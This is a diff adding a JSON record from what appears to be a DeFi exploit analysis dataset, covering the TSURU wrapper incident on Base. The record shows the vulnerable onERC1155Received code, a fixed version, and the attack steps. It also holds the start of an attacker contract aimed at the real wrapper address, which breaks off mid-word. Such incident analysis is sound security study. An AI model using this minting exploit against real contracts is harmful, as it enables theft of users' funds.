@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-05-XX_TSURU_OnERC1155ReceivedUnauthorized",
+ "source_file": "2024/2024-05-XX_TSURU_OnERC1155ReceivedUnauthorized.md",
+ "title": "TSURU — Missing Caller Validation in onERC1155Received Analysis",
+ "date": "2024-05-01",
+ "protocol": "TSURU",
+ "chain": "Base",
+ "loss_raw": "~$140,000",
+ "loss_usd": 140000.0,
+ "root_cause": "The `onERC1155Received()` callback does not validate the caller, allowing the attacker to invoke the callback directly without an actual ERC1155 transfer to mint 167.2M TSURU tokens and swap them for WETH",
+ "attack_tx": null,
+ "vulnerable_contract": "Tsuru Wrapper 0x75Ac62EA",
+ "classes": [
+  "nft"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no caller validation in onERC1155Received\ncontract TsuruWrapper {\n    address public erc1155Token;\n\n    // Callback invoked by ERC1155 safeTransferFrom\n    // However, anyone can call this directly\n    function onERC1155Received(\n        address operator,\n        address from,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external returns (bytes4) {\n        // No msg.sender validation — attacker can call directly\n        // Mints TSURU proportional to value\n        _mint(from, value * MINT_RATIO);\n        return this.onERC1155Received.selector;\n    }\n}\n\n//",
+  "// File: TSURUWrapper.sol\n    function onERC1155Received(\n        address,\n        address from,\n        uint256 id,\n        uint256 amount,\n        bytes calldata\n    ) external override nonReentrant returns (bytes4) {\n        require(id == tokenID, \"Token ID does not match\");\n        \n        if (msg.sender == address(erc1155Contract)) {\n            return this.onERC1155Received.selector;\n        }\n\n        _safeMint(from, amount * ERC1155_RATIO); // Adjust minting based on the ERC1155_RATIO  // ❌ Vulnerability\n        return this.onERC1155Received.selector;\n    }"
+ ],
+ "code_after": [
+  "✅ Safe code: validates that the caller is a trusted ERC1155 contract\nfunction onERC1155Received(\n    address operator,\n    address from,\n    uint256 id,\n    uint256 value,\n    bytes calldata data\n) external returns (bytes4) {\n    require(msg.sender == erc1155Token, \"caller not erc1155 token\");\n    _mint(from, value * MINT_RATIO);\n    return this.onERC1155Received.selector;\n}"
+ ],
+ "steps": [
+  "→ [1] TsuruWrapper.onERC1155Received(",
+  "No msg.sender validation → _mint(attacker, 167.2M TSURU)",
+  "→ [2] Uniswap V3 Pool.swap(TSURU → WETH)",
+  "167.2M TSURU → ~137.9 WETH",
+  "→ [3] ~$140K worth of WETH drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] TsuruWrapper.onERC1155Received(\n  │         operator = attacker,\n  │         from     = attacker,\n  │         id       = 0,\n  │         value    = 167_200_000,  ← arbitrary mint amount specified\n  │         data     = \"\"\n  │       )\n  │         └─ No msg.sender validation → _mint(attacker, 167.2M TSURU)\n  │\n  ├─→ [2] Uniswap V3 Pool.swap(TSURU → WETH)\n  │         └─ 167.2M TSURU → ~137.9 WETH\n  │\n  └─→ [3] ~$140K worth of WETH drained",
+  "interface IWrapper {\n    function onERC1155Received(\n        address operator,\n        address from,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external returns (bytes4);\n}\n\ninterface IUniswapV3Pool {\n    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n}\n\ncontract AttackContract {\n    IWrapper       constant wrapper = IWrapper(0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA);\n    IUniswapV3Pool constant pool    = IUniswapV3Pool(/* TSURU/WETH V3 pool */);\n    IERC20 constant TSURU = IERC20(/* TSURU token */);\n    IERC20 constant WETH  = IERC20(0x4200000000000000000000000000000000000006);\n\n    f"
+ ]
+}
